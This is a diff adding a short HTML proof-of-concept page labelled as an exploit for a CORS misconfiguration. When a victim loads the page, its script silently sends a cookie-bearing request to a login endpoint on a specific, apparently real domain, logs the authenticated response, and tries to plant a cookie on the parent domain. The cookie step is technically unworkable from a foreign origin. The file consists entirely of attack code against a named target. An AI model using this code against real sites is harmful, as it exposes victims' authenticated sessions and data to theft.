@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+    <script>
+        window.onload = function() {
+            // Create a new XMLHttpRequest object
+            var xhr = new XMLHttpRequest();
+            
+            // Configure it: GET-request for the URL /ucentre/login/80222fd74590445c981105503458e162 with credentials
+            xhr.open('GET', 'https://enginelark.okg.com/ucentre/login/80222fd74590445c981105503458e162', true);
+            xhr.withCredentials = true;  // This sends the request with credentials (cookies)
+            
+            // Set up a function to handle the response
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    console.log('Response:', xhr.responseText);
+                    
+                    // Attempt to set a cookie on enginelark.okg.com
+                    document.cookie = "turbo-cdn=cookiesHere; domain=.okg.com; path=/";
+                }
+            };
+            
+            // Send the request
+            xhr.send();
+        };
+    </script>
+</head>
+<body>
+    <h1>Exploiting CORS Misconfiguration</h1>
+</body>
+</html>
